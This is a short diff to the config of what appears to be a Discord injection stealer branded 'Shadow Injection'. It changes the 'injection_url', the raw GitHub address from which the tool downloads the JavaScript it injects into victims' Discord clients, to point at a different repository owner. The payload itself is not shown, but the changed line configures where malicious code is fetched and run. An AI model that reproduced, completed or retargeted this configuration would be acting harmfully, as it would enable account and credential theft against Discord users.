@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Shadow Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1091812053481693237/1091812173505904790/ca86d4ece0013a4274283278ac0f7fd7.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Alesterox/injection/main/index.js', 
   /**
    
    **/
